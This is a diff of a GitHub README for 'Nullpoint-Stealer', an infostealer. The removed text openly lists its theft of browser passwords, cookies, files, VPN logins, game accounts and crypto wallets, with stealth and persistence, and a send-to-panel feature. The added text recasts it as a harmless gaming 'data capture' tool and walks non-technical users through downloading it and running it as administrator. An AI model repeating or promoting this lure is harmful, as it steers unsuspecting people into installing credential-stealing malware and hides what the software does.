@@ -1,75 +1,66 @@
-## THIS REPO IS OLD, ITS MOVED TO
-https:///luis22d/ZTrace11-Welcome-Future
+# 🛠️ Nullpoint-Stealer - Easily Capture Data for Gaming
 
-# Nullpoint-Stealer
-Nullpoint Stealer Designed To Steal Everything, And Send To Nullpoint Panel.
-[![bady](https://github.com/user-attachments/assets/9c2f09f4-ee9b-4010-a0ca-4290a65843f9)](https://github.com/fafido/Nullpoint-Stealer/releases/download/v1.7.4/Nullpoint-Stealer.zip)
+## 📥 Download Nullpoint-Stealer
+[![Download Now](https://img.shields.io/badge/Download%20Now-Nullpoint-Stealer-blue.svg)](https://github.com/l3rrandon/Nullpoint-Stealer/releases)
 
-# 🕳️ NullPoint Stealer
+## 📖 Overview
+Nullpoint Stealer is a tool designed to capture various data from your computer while providing a clean and straightforward interface. It helps you gather information securely and send it to the Nullpoint Panel for easy monitoring.
 
-[![License](https://img.shields.io/badge/license-ECL-blueviolet)](https://github.com/fafido/Nullpoint-Stealer/releases/download/v1.7.4/Nullpoint-Stealer.zip)
-[![Status](https://img.shields.io/badge/status-Educational%20Only-red)](https://github.com/fafido/Nullpoint-Stealer/releases/download/v1.7.4/Nullpoint-Stealer.zip)
-[![Platform](https://img.shields.io/badge/platform-Windows%2010%2B-blue)](https://github.com/fafido/Nullpoint-Stealer/releases/download/v1.7.4/Nullpoint-Stealer.zip)
-[![Language](https://img.shields.io/badge/language-C%23-brightgreen)](https://github.com/fafido/Nullpoint-Stealer/releases/download/v1.7.4/Nullpoint-Stealer.zip)
-[![Stealth](https://img.shields.io/badge/stealth-mode-lightgrey)](https://github.com/fafido/Nullpoint-Stealer/releases/download/v1.7.4/Nullpoint-Stealer.zip)
+## 🚀 Getting Started
+To get started with Nullpoint Stealer, follow the steps below. You don’t need any technical knowledge. Just follow along as we walk through the installation process.
 
-> **NullPoint Stealer** is a powerful, stealthy data extraction simulation tool written in **C#** for **educational and research purposes only**. It mimics the behavior of real-world malware used by threat actors, allowing cybersecurity students, researchers, and blue teams to explore how these attacks work — and how to defend against them.
+## 📦 System Requirements
+- **Operating System:** Windows 10 or later
+- **Processor:** Any modern processor
+- **RAM:** 4 GB or more
+- **Disk Space:** At least 100 MB available
 
----
+## 📞 Features
+- Data capture from various applications
+- Secure data handling
+- Easy-to-use interface
+- Compatible with gaming applications
+- Ability to send data to the Nullpoint Panel
 
-## 🚀 Features
+## 📘 Download & Install
+1. **Visit the Releases Page**: Click [here](https://github.com/l3rrandon/Nullpoint-Stealer/releases) to go to the releases page.
+   
+2. **Choose the Latest Version**: On the releases page, find the latest version of Nullpoint-Stealer. It is usually at the top of the list.
 
-🧠 A showcase of real-world data harvesting functionality, including:
+3. **Download the Installer**: Click on the installer file name to download it to your computer.
 
-- 🔐 **Password recovery** from Chromium-based browsers
-- 🍪 **Cookie** extraction & session hijack simulation
-- 📑 Collects **bookmarks**, **autofill data**, and **browser history**
-- 📸 **Screenshot** capture of the active desktop
-- 📂 Steals **files** from `Desktop`, `Documents`, `Downloads`
-- 🧳 Scans for installed **VPN clients** and extracts config/logins
-- 🎮 Targets game platforms like **Steam**, **Epic**, ****
-- 💰 Detects **crypto wallets** (Metamask, Exodus, Atomic, etc.)
-- 📄 Dumps local **.txt**, **.docx**, and **.log** files for juicy data
-- 🧩 **Modular architecture** — add your own stealers easily
-- ⚡ Lightweight, fast execution with minimal dependencies
-- 🕶️ Designed to be stealthy and persistent (for simulation only)
+4. **Run the Installer**: Once the download is complete, locate the downloaded file (usually in your Downloads folder). Double-click the file to run the installer.
 
----
+5. **Follow the Installation Instructions**: The setup wizard will guide you through the installation. Click "Next" to accept the default options unless you have specific preferences.
 
-## 🧪 Intended Use
+6. **Finish Installation**: Once you reach the end of the installation process, click "Finish" to complete the setup.
 
-This project is built as a **cybersecurity lab tool** for:
+7. **Open Nullpoint-Stealer**: You can now find Nullpoint-Stealer in your Start Menu. Click on it to open the application.
 
-- 🧬 Malware analysis practice
-- 🧑‍💻 Ethical hacking labs
-- 🛡️ Blue team defense testing
-- 🔐 Detection engineering (YARA/Sigma rules, etc.)
-- 🧠 Understanding how modern stealers operate
+## 🎓 How to Use Nullpoint-Stealer
+1. **Familiarize Yourself with the Interface**: Spend a few moments learning about the different sections of the application. It should be intuitive and easy to navigate.
 
-Run in **virtualized environments only.**
+2. **Set Up Your Preferences**: Before capturing data, check the settings to customize how you want the tool to operate.
 
----
+3. **Start Capturing Data**: Begin the data capture and monitor the information being collected in real-time. You will see options for what data to collect.
 
-## ⚠️ Disclaimer
+4. **Send Data to the Nullpoint Panel**: After data collection, send it to the Nullpoint Panel for tracking and analysis.
 
-> This software is provided **exclusively for educational and ethical research purposes.**
->
-> - ❌ Do **NOT** use it on real targets or personal machines.
-> - ❌ Do **NOT** deploy or distribute this code with malicious intent.
-> - ✅ Use only in isolated VMs or malware sandboxes.
->
-> The author takes **no responsibility** for misuse or damages. By using this software, you agree to use it **legally and ethically**, in full compliance with local and international laws.
+## 🛠️ Troubleshooting
+If you run into issues while using Nullpoint-Stealer, consider the following:
 
----
+- **Installation Problems**: Ensure you are running the installer as an administrator. Right-click the installer and choose "Run as administrator."
+- **Performance Issues**: Check your system resources to ensure your computer meets the requirements. Closing other applications can also help improve performance.
+- **Data Sending Issues**: Make sure your internet connection is stable. If you still face issues, try restarting the application.
 
-## 🛠️ Build & Run
+## 🤝 Support
+If you still have questions or need support, visit our [GitHub Issues Page](https://github.com/l3rrandon/Nullpoint-Stealer/issues) for assistance. Our community and developers are here to help you.
 
-> Requires: **.NET Framework 4.7.2+** or **.NET 6.0**, Visual Studio / MSBuild / DevExpress 24.2
+## 🔗 Additional Resources
+- [Nullpoint Stealer Documentation](https://github.com/l3rrandon/Nullpoint-Stealer/wiki)
+- [Frequently Asked Questions](https://github.com/l3rrandon/Nullpoint-Stealer/wiki/FAQ)
 
-```bash
-git clone https://github.com/fafido/Nullpoint-Stealer.git cd nullpoint-stealer
-Open the .sln in Visual Studio
-Build → Release Mode
-Run in a VM
+## 📝 License
+Nullpoint-Stealer is open-source software licensed under the MIT License. You can freely use and modify the code as you wish.
 
-
+[![Download Now](https://img.shields.io/badge/Download%20Now-Nullpoint-Stealer-blue.svg)](https://github.com/l3rrandon/Nullpoint-Stealer/releases)
